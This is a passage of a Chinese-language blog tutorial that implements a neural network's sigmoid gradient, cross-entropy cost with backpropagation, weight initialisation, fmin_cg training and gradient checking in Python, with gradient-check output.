0.383770)&#x27;</span>.<span class="built_in">format</span>(cost))</span><br><span class="line"><span class="comment"># 验证sigmoid的梯度</span></span><br><span class="line">g = sigmoid_gradient(np.array([-<span class="number">1</span>, -<span class="number">0.5</span>, <span class="number">0</span>, <span class="number">0.5</span>, <span class="number">1</span>]))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Sigmoid gradient evaluated at [-1  -0.5  0  0.5  1]:\n&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(g))</span><br></pre></td></tr></table></figure>
<ul>
<li>flatten()：把数组变成一列的形式，等价于 reshape</li>
<li>concatenate(a1,a2,…)：能够一次完成多个数组的拼接，其中 a1,a2,… 是数组类型的参数 </li>
</ul>
<p>接下来就分析分析最核心的两个函数：sigmoid_gradient，nn_cost_function</p>
<ul>
<li>sigmoid_gradient：计算 sigmoid 函数的梯度（后面会详细分析）</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sigmoid</span>(<span class="params">z</span>):</span></span><br><span class="line">	g = <span class="number">1</span>/(<span class="number">1</span>+np.exp(-z)) <span class="comment"># 就是Sigmoid函数</span></span><br><span class="line">	<span class="keyword">return</span> g</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sigmoid_gradient</span>(<span class="params">z</span>):</span></span><br><span class="line">	grad = sigmoid(z) * (<span class="number">1</span>-sigmoid(z))</span><br><span class="line">	<span class="keyword">return</span> grad</span><br></pre></td></tr></table></figure>
<ul>
<li>nn_cost_function：用于计算代价（代价函数-交叉熵）</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> sigmoid <span class="keyword">import</span> sigmoid</span><br><span class="line"><span class="keyword">from</span> sigmoid <span class="keyword">import</span> sigmoid_gradient</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">nn_cost_function</span>(<span class="params">X,Y,nn_paramters,input_layer,hidden_layer,out_layer,lmd=<span class="number">0</span></span>):</span></span><br><span class="line">    </span><br><span class="line">	theta1 = nn_paramters[:hidden_layer*(input_layer+<span class="number">1</span>)].reshape(hidden_layer,input_layer+<span class="number">1</span>) <span class="comment"># 取出theta1</span></span><br><span class="line">	theta2 = nn_paramters[hidden_layer*(input_layer+<span class="number">1</span>):].reshape(out_layer,hidden_layer+<span class="number">1</span>) <span class="comment"># 取出theta2</span></span><br><span class="line">	m = Y.size <span class="comment"># 获取样本数目</span></span><br><span class="line"></span><br><span class="line">	<span class="comment"># 输入层的输出等于输入,X增加一列偏置维度</span></span><br><span class="line">	a1 = np.column_stack((np.ones(X.shape[<span class="number">0</span>]),X)) <span class="comment"># 5000*401</span></span><br><span class="line">	<span class="comment"># 隐藏层的输入和输出</span></span><br><span class="line">	z2 = a1.dot(theta1.T) <span class="comment"># 5000*25</span></span><br><span class="line">	a2 = sigmoid(z2)</span><br><span class="line">	a2 = np.column_stack((np.ones(a2.shape[<span class="number">0</span>]),a2)) <span class="comment"># 5000*26</span></span><br><span class="line">	<span class="comment"># 输出层的输入和输出</span></span><br><span class="line">	z3 = a2.dot(theta2.T) <span class="comment"># 5000*10</span></span><br><span class="line">	a3 = sigmoid(z3) <span class="comment"># 5000*10</span></span><br><span class="line">    </span><br><span class="line">	<span class="comment"># a3[m,k]表示第m个样本预测属于k的概率(因为激活函数是logistic函数)</span></span><br><span class="line">	<span class="comment"># 根据Y的值,也转换成和a3相同格式的数组</span></span><br><span class="line">	<span class="comment"># yk中每一行只能有一列值为1,yk[m,k]=1表示第m个样本的真实输出是k,其他列为0</span></span><br><span class="line">	yk = np.zeros((m,out_layer))</span><br><span class="line">	<span class="comment"># 注意:Y中的取值范围是[1,10],而yk中的列下标范围是[0,9]</span></span><br><span class="line">	<span class="keyword">for</span> num <span class="keyword">in</span> <span class="built_in">range</span>(Y.size):</span><br><span class="line">		yk[num,Y[num]-<span class="number">1</span>] = <span class="number">1</span></span><br><span class="line">        </span><br><span class="line">	<span class="comment"># 计算代价,因为输出层的激活函数是logistic函数,所有代价也是以logistic regression代价函数</span></span><br><span class="line">	cost_arr = - yk * np.log(a3) - (<span class="number">1</span>-yk) * np.log(<span class="number">1</span>-a3)</span><br><span class="line">	cost = cost_arr.<span class="built_in">sum</span>()/m + lmd /(<span class="number">2</span>*m) *( (theta1[:,<span class="number">1</span>:] **<span class="number">2</span>).<span class="built_in">sum</span>() + (theta2[:,<span class="number">1</span>:] **<span class="number">2</span>).<span class="built_in">sum</span>())</span><br><span class="line"></span><br><span class="line">	<span class="comment"># 使用BP算法计算梯度</span></span><br><span class="line">	delta3 = a3 - yk <span class="comment"># 5000*10</span></span><br><span class="line"></span><br><span class="line">	delta2 = delta3.dot(theta2) * sigmoid_gradient(np.column_stack((np.ones(z2.shape[<span class="number">0</span>]),z2)))</span><br><span class="line">	delta2 = delta2[:,<span class="number">1</span>:] <span class="comment"># 5000*25</span></span><br><span class="line">	<span class="comment"># theta1的梯度</span></span><br><span class="line">	theta1_grad = np.zeros(theta1.shape) <span class="comment"># 25 x 401</span></span><br><span class="line">	theta1_grad = theta1_grad + (delta2.T).dot(a1) <span class="comment"># 25*401</span></span><br><span class="line">	nn_parameter1_grad = theta1_grad/m + (lmd/m) * np.column_stack((np.zeros(theta1.shape[<span class="number">0</span>]),theta1[:,<span class="number">1</span>:]))</span><br><span class="line">	<span class="comment"># theta2的梯度</span></span><br><span class="line">	theta2_grad = np.zeros(theta2.shape) <span class="comment"># 10 x 26</span></span><br><span class="line">	theta2_grad = theta2_grad + (delta3.T).dot(a2) <span class="comment"># 10*26</span></span><br><span class="line">	nn_parameter2_grad = theta2_grad/m + (<span class="number">1</span>/m) * np.column_stack((np.zeros(theta2.shape[<span class="number">0</span>]),theta2[:,<span class="number">1</span>:]))</span><br><span class="line">	<span class="comment"># 返回梯度</span></span><br><span class="line">	grad = np.concatenate([nn_parameter1_grad.flatten(),nn_parameter2_grad.flatten()])</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> cost,grad</span><br></pre></td></tr></table></figure>
<ul>
<li>上一个实验是直接导入的 theta1，theta2，而这个实验是用 <strong>交叉熵</strong> 计算出来的</li>
<li>其中包括了反向传播算法（BP算法）来计算梯度，后面会进行分析</li>
<li>PS：高数和线代太菜了，数学上的理解有点困难，所以我就不折磨自己了</li>
</ul>
<h2 id="Backpropagation（反向传播）"><a href="#Backpropagation（反向传播）" class="headerlink" title="Backpropagation（反向传播）"></a>Backpropagation（反向传播）</h2><p>在这部分练习中，您将实现反向传播算法来计算神经网络代价函数的梯度</p>
<ul>
<li>上一阶段完成的 nnCostFunction.m 会返回一个合适的梯度值（本阶段还会分析一下 nnCostFunction.m 中，使用BP算法计算梯度的那部分）</li>
<li>一旦计算出梯度，就可以通过使用先进的优化器 fmincg（类似于fminunc）最小化代价函数 J(θ)，训练神经网络</li>
<li>首先，实现反向传播算法来计算（未规范化）神经网络参数的梯度</li>
<li>在验证了针对非正则化情况的梯度计算是正确的之后，您将实现正则化神经网络的梯度</li>
</ul>
<p><strong>Sigmoid gradient（Sigmoid 梯度）</strong></p>
<p>为了帮助您开始这部分练习，您将首先实现 sigmoid gradient 函数，用于计算 Sigmoid 梯度</p>
<p>sigmoid 函数的梯度计算公式为：</p>
<script type="math/tex; mode=display">
sigmoid(z)=g(z)=\frac{1}{1+e^{-z}}\\
g^{'}(z)=\frac{d}{d_{z}}g(z)=g(z)(1-g(z))</script><p>实现代码如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sigmoid</span>(<span class="params">z</span>):</span></span><br><span class="line">	g = <span class="number">1</span>/(<span class="number">1</span>+np.exp(-z)) <span class="comment"># 就是Sigmoid函数</span></span><br><span class="line">	<span class="keyword">return</span> g</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sigmoid_gradient</span>(<span class="params">z</span>):</span></span><br><span class="line">	grad = sigmoid(z) * (<span class="number">1</span>-sigmoid(z)) <span class="comment"># g(z)=g(z)(1-g(z))</span></span><br><span class="line">	<span class="keyword">return</span> grad</span><br></pre></td></tr></table></figure>
<p><strong>Random initialization（随机初始化）</strong></p>
<p>在训练神经网络时，重要的是随机初始化对称性破坏的参数</p>
<ul>
<li>随机初始化的一个有效策略是在范围内均匀地随机选择 θ(l) 的值（范围是：[−init, init]）</li>
<li>您应该使用 init(ε)=0.12.2 ，这个值范围确保参数保持较小，并使学习更有效</li>
<li>你的工作是完成 randInitializeWeights.m 初始化θ的权重</li>
</ul>
<p>选择 init 的一个有效策略是基于神经网络中的单元数：</p>
<script type="math/tex; mode=display">
ε_{init}=\frac{\sqrt{6}}{\sqrt{L_{in}+L_{out}}}\,\,\,\,
(L_{in}=s_l,L_{out}=s_{l+1})\\
PS:s_l和s_{l+1}是相邻层中的单元数</script><p>实现代码为：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="comment"># 初始化网络参数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rand_init_weights</span>(<span class="params">L_in,L_out</span>):</span></span><br><span class="line">	epsilon = np.sqrt(<span class="number">6</span>) / np.sqrt(L_in + L_out)</span><br><span class="line">	init_theta = np.random.random((L_out,L_in+<span class="number">1</span>)) * <span class="number">2</span>*epsilon - epsilon</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> init_theta</span><br></pre></td></tr></table></figure>
<ul>
<li>sqrt(x)：对“x”开平方</li>
<li>random.random(x,y)：获取一个范围在 [x,y] 的随机浮点数</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># =========================== 3.初始化网络参数 =================================</span></span><br><span class="line">random_theta1 = rand_init_weights(input_layer,hidden_layer) <span class="comment"># 初始化网络参数 </span></span><br><span class="line">random_theta2 = rand_init_weights(hidden_layer,out_layer) <span class="comment"># 初始化网络参数</span></span><br><span class="line">rand_nn_parameters = np.concatenate([random_theta1.flatten(),random_theta2.flatten()]) <span class="comment"># 组合后的随机参数(θ集)</span></span><br><span class="line"></span><br><span class="line">lmd =<span class="number">3</span></span><br><span class="line">check_nn_gradients(lmd) <span class="comment"># 梯度检测</span></span><br><span class="line">debug_cost, _ = nn_cost_function(X,Y,nn_paramters,input_layer,hidden_layer,out_layer,lmd) <span class="comment"># 代价函数,用于计算初始代价值</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Cost at (fixed) debugging parameters (w/ lambda = &#123;&#125;): &#123;:0.6f&#125;\n(for lambda = 3, this value should be about 0.576051)&#x27;</span>.<span class="built_in">format</span>(lmd, debug_cost))</span><br></pre></td></tr></table></figure>
<p><strong>Backpropagation（反向传播的核心算法）</strong></p>
<p>对于反向传播，其实就是进行了如下的一次运算：</p>
<script type="math/tex; mode=display">
δ^{(l)}_{j}=a^{(l)}_{j}-y_j</script><ul>
<li>计算出各个层的 “δ(l,j)”，代表了第 l 层的第 j 结点的误差</li>
</ul>
<p>计算案例：</p>
<script type="math/tex; mode=display">
For\,each\,output\,unit(layer\,\,L=4)\\δ^{(4)}=a^{(4)}-y\\δ^{(3)}=(θ^{(3)})^{T}δ^{(4)}.*g^{'}(z^{(3)})\\δ^{(2)}=(θ^{(3)})^{T}δ^{(3)}.*g^{'}(z^{(2)})</script><ul>
<li>对于最后一层（输出层），δ4 就是 a4（输出层预测的结果）和 y（真实的结果）之间的差值</li>
<li>而对于中间的隐藏层，因为不清楚“预测结果”和“真实结果”的具体值，所以就只能通过以上的公式进行模拟计算</li>
</ul>
<p>最后，回顾一下“代价函数-交叉熵”的计算过程：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> sigmoid <span class="keyword">import</span> sigmoid</span><br><span class="line"><span class="keyword">from</span> sigmoid <span class="keyword">import</span> sigmoid_gradient</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">nn_cost_function</span>(<span class="params">X,Y,nn_paramters,input_layer,hidden_layer,out_layer,lmd=<span class="number">0</span></span>):</span></span><br><span class="line">    </span><br><span class="line">	theta1 = nn_paramters[:hidden_layer*(input_layer+<span class="number">1</span>)].reshape(hidden_layer,input_layer+<span class="number">1</span>) <span class="comment"># 取出theta1</span></span><br><span class="line">	theta2 = nn_paramters[hidden_layer*(input_layer+<span class="number">1</span>):].reshape(out_layer,hidden_layer+<span class="number">1</span>) <span class="comment"># 取出theta2</span></span><br><span class="line">	m = Y.size <span class="comment"># 获取样本数目</span></span><br><span class="line"></span><br><span class="line">	<span class="comment"># 输入层的输出等于输入,X增加一列偏置维度</span></span><br><span class="line">	a1 = np.column_stack((np.ones(X.shape[<span class="number">0</span>]),X)) <span class="comment"># 5000*401</span></span><br><span class="line">	<span class="comment"># 隐藏层的输入和输出</span></span><br><span class="line">	z2 = a1.dot(theta1.T) <span class="comment"># 5000*25</span></span><br><span class="line">	a2 = sigmoid(z2)</span><br><span class="line">	a2 = np.column_stack((np.ones(a2.shape[<span class="number">0</span>]),a2)) <span class="comment"># 5000*26</span></span><br><span class="line">	<span class="comment"># 输出层的输入和输出</span></span><br><span class="line">	z3 = a2.dot(theta2.T) <span class="comment"># 5000*10</span></span><br><span class="line">	a3 = sigmoid(z3) <span class="comment"># 5000*10</span></span><br><span class="line">    </span><br><span class="line">	<span class="comment"># a3[m,k]表示第m个样本预测属于k的概率(因为激活函数是logistic函数)</span></span><br><span class="line">	<span class="comment"># 根据Y的值,也转换成和a3相同格式的数组</span></span><br><span class="line">	<span class="comment"># yk中每一行只能有一列值为1,yk[m,k]=1表示第m个样本的真实输出是k,其他列为0</span></span><br><span class="line">	yk = np.zeros((m,out_layer))</span><br><span class="line">	<span class="comment"># 注意:Y中的取值范围是[1,10],而yk中的列下标范围是[0,9]</span></span><br><span class="line">	<span class="keyword">for</span> num <span class="keyword">in</span> <span class="built_in">range</span>(Y.size):</span><br><span class="line">		yk[num,Y[num]-<span class="number">1</span>] = <span class="number">1</span></span><br><span class="line">        </span><br><span class="line">	<span class="comment"># 计算代价,因为输出层的激活函数是logistic函数,所有代价也是以logistic regression代价函数</span></span><br><span class="line">	cost_arr = - yk * np.log(a3) - (<span class="number">1</span>-yk) * np.log(<span class="number">1</span>-a3)</span><br><span class="line">	cost = cost_arr.<span class="built_in">sum</span>()/m + lmd /(<span class="number">2</span>*m) *( (theta1[:,<span class="number">1</span>:] **<span class="number">2</span>).<span class="built_in">sum</span>() + (theta2[:,<span class="number">1</span>:] **<span class="number">2</span>).<span class="built_in">sum</span>())</span><br><span class="line"></span><br><span class="line">	<span class="comment"># 使用BP算法计算梯度</span></span><br><span class="line">	delta3 = a3 - yk <span class="comment"># 5000*10</span></span><br><span class="line"></span><br><span class="line">	delta2 = delta3.dot(theta2) * sigmoid_gradient(np.column_stack((np.ones(z2.shape[<span class="number">0</span>]),z2)))</span><br><span class="line">	delta2 = delta2[:,<span class="number">1</span>:] <span class="comment"># 5000*25</span></span><br><span class="line">	<span class="comment"># theta1的梯度</span></span><br><span class="line">	theta1_grad = np.zeros(theta1.shape) <span class="comment"># 25 x 401</span></span><br><span class="line">	theta1_grad = theta1_grad + (delta2.T).dot(a1) <span class="comment"># 25*401</span></span><br><span class="line">	nn_parameter1_grad = theta1_grad/m + (lmd/m) * np.column_stack((np.zeros(theta1.shape[<span class="number">0</span>]),theta1[:,<span class="number">1</span>:]))</span><br><span class="line">	<span class="comment"># theta2的梯度</span></span><br><span class="line">	theta2_grad = np.zeros(theta2.shape) <span class="comment"># 10 x 26</span></span><br><span class="line">	theta2_grad = theta2_grad + (delta3.T).dot(a2) <span class="comment"># 10*26</span></span><br><span class="line">	nn_parameter2_grad = theta2_grad/m + (<span class="number">1</span>/m) * np.column_stack((np.zeros(theta2.shape[<span class="number">0</span>]),theta2[:,<span class="number">1</span>:]))</span><br><span class="line">	<span class="comment"># 返回梯度</span></span><br><span class="line">	grad = np.concatenate([nn_parameter1_grad.flatten(),nn_parameter2_grad.flatten()])</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> cost,grad</span><br></pre></td></tr></table></figure>
<h2 id="Model-Training（模型训练）"><a href="#Model-Training（模型训练）" class="headerlink" title="Model Training（模型训练）"></a>Model Training（模型训练）</h2><p>代码实现：这里采用 fmincg 来代替梯度下降</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ========================== 4.训练NN ==========================================</span></span><br><span class="line">lmd = <span class="number">1</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cost_func</span>(<span class="params">p</span>):</span></span><br><span class="line">    <span class="keyword">return</span> nn_cost_function(X,Y,p,input_layer,hidden_layer,out_layer,lmd)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">grad_func</span>(<span class="params">p</span>):</span></span><br><span class="line">    <span class="keyword">return</span> nn_cost_function(X,Y,p,input_layer,hidden_layer,out_layer,lmd)[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">nn_params, *unused = opt.fmin_cg(cost_func, fprime=grad_func, x0=rand_nn_parameters, maxiter=<span class="number">400</span>, disp=<span class="literal">True</span>, full_output=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 从返回结果nn_params中获取θ1和θ2(拟合完毕)</span></span><br><span class="line">theta1 = nn_params[:hidden_layer * (input_layer + <span class="number">1</span>)].reshape(hidden_layer, input_layer + <span class="number">1</span>)</span><br><span class="line">theta2 = nn_params[hidden_layer * (input_layer + <span class="number">1</span>):].reshape(out_layer, hidden_layer + <span class="number">1</span>)</span><br></pre></td></tr></table></figure>
<ul>
<li>fmincg 是一种高效的迭代器，它的需要主要参数依次为：<ul>
<li>nn_cost_function 返回的代价</li>
<li>nn_cost_function 返回的梯度</li>
<li>rand_nn_parameters 中存储的随机参数集</li>
</ul>
</li>
</ul>
<h2 id="Gradient-checking（梯度检测）"><a href="#Gradient-checking（梯度检测）" class="headerlink" title="Gradient checking（梯度检测）"></a>Gradient checking（梯度检测）</h2><p>梯度检测会估计梯度（导数）值，然后和你程序计算出来的梯度的值进行对比，以判断程序算出的梯度值是否正确</p>
<p>公式为：</p>
<script type="math/tex; mode=display">
\frac{J(θ_{1}+ε,θ_{2},θ_{3},...,θ_{n})-J(θ_{1}-ε,θ_{2},θ_{3},...,θ_{n})}{2ε}</script><p>实现过程为：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> debugInitializeWeights <span class="keyword">as</span> diw <span class="comment"># 初始化权重的函数</span></span><br><span class="line"><span class="keyword">import</span> costFunction <span class="keyword">as</span> ncf <span class="comment"># 计算代价的函数</span></span><br><span class="line"><span class="keyword">import</span> computeNumericalGradient <span class="keyword">as</span> cng <span class="comment"># 计算梯度(倒数)的函数</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_nn_gradients</span>(<span class="params">lmd</span>):</span></span><br><span class="line">    input_layer_size = <span class="number">3</span></span><br><span class="line">    hidden_layer_size = <span class="number">5</span></span><br><span class="line">    num_labels = <span class="number">3</span></span><br><span class="line">    m = <span class="number">5</span></span><br><span class="line">    <span class="comment"># We generatesome &#x27;random&#x27; test data</span></span><br><span class="line">    theta1 = diw.debug_initialize_weights(hidden_layer_size, input_layer_size)</span><br><span class="line">    theta2 = diw.debug_initialize_weights(num_labels, hidden_layer_size)</span><br><span class="line">    <span class="comment"># Reusing debugInitializeWeights to genete X</span></span><br><span class="line">    X = diw.debug_initialize_weights(m, input_layer_size - <span class="number">1</span>)</span><br><span class="line">    y = <span class="number">1</span> + np.mod(np.arange(<span class="number">1</span>, m + <span class="number">1</span>), num_labels)</span><br><span class="line">    <span class="comment"># Unroll parameters</span></span><br><span class="line">    nn_params = np.concatenate([theta1.flatten(), theta2.flatten()]) </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">cost_func</span>(<span class="params">p</span>):</span></span><br><span class="line">        <span class="keyword">return</span> ncf.nn_cost_function(X,y,p, input_layer_size, hidden_layer_size, num_labels, lmd)</span><br><span class="line">    cost, grad = cost_func(nn_params) <span class="comment"># 通过我们的&quot;代价函数cost_func&quot;计算梯度</span></span><br><span class="line">    numgrad = cng.compute_numerial_gradient(cost_func, nn_params) <span class="comment"># 直接计算梯度</span></span><br><span class="line">    <span class="built_in">print</span>(np.c_[grad, numgrad]) <span class="comment"># 打印结果</span></span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 初始化权重的函数  </span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug_initialize_weights</span>(<span class="params">fan_out, fan_in</span>):</span></span><br><span class="line">    w = np.zeros((fan_out, <span class="number">1</span> + fan_in))</span><br><span class="line">    w = np.sin(np.arange(w.size)).reshape(w.shape) / <span class="number">10</span></span><br><span class="line">    <span class="keyword">return</span> w</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算梯度(倒数)的函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">compute_numerial_gradient</span>(<span class="params">cost_func, theta</span>):</span></span><br><span class="line">    numgrad = np.zeros(theta.size)</span><br><span class="line">    perturb = np.zeros(theta.size)</span><br><span class="line">    e = <span class="number">1e-4</span></span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> <span class="built_in">range</span>(theta.size):</span><br><span class="line">        perturb[p] = e</span><br><span class="line">        loss1, grad1 = cost_func(theta - perturb)</span><br><span class="line">        loss2, grad2 = cost_func(theta + perturb)</span><br><span class="line"></span><br><span class="line">        numgrad[p] = (loss2 - loss1) / (<span class="number">2</span> * e)</span><br><span class="line">        perturb[p] = <span class="number">0</span></span><br><span class="line">    <span class="keyword">return</span> numgrad</span><br></pre></td></tr></table></figure>
<ul>
<li>在本实验中，我们只对“lmd=3”进行了梯度检测，检测结果如下：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">[[ <span class="number">0.00901304</span>  <span class="number">0.00901304</span>]</span><br><span class="line"> [ <span class="number">0.05042745</span>  <span class="number">0.05042745</span>]</span><br><span class="line"> [ <span class="number">0.05455088</span>  <span class="number">0.05455088</span>]</span><br><span class="line"> [ <span class="number">0.00852048</span>  <span class="number">0.00852048</span>]</span><br><span class="line"> [ <span class="number">0.01171933</span>  <span class="number">0.01171933</span>]</span><br><span class="line"> [<span class="number">-0.05760601</span> <span class="number">-0.05760601</span>]</span><br><span class="line"> [<span class="number">-0.01659828</span> <span class="number">-0.01659828</span>]</span><br><span class="line"> [ <span class="number">0.03966983</span>  <span class="number">0.03966983</span>]</span><br><span class="line"> [ <span class="number">0.00366088</span>  <span class="number">0.00366088</span>]</span><br><span class="line"> [ <span class="number">0.02471166</span>  <span class="number">0.02471166</span>]</span><br><span class="line"> [<span class="number">-0.03245445</span> <span class="number">-0.03245445</span>]</span><br><span class="line"> [<span class="number">-0.05978209</span> <span class="number">-0.05978209</span>]</span><br><span class="line"> [<span class="number">-0.0077655</span>  <span class="number">-0.0077655</span> ]</span><br><span class="line"> [ <span class="number">0.02526392</span>  <span class="number">0.02526392</span>]</span><br><span class="line"> [ <span class="number">0.05947174</span>  <span class="number">0.05947174</span>]</span><br><span class="line"> [ <span class="number">0.03900152</span>  <span class="number">0.03900152</span>]</span><br><span class="line"> [<span class="number">-0.01206378</span> <span class="number">-0.01206378</span>]</span><br><span class="line"> [<span class="number">-0.05761021</span> <span class="number">-0.05761021</span>]</span><br><span class="line"> [<span class="number">-0.04520795</span> <span class="number">-0.04520795</span>]</span><br><span class="line"> [ <span class="number">0.0087583</span>   <span class="number">0.0087583</span> ]</span><br><span class="line"> [ <span 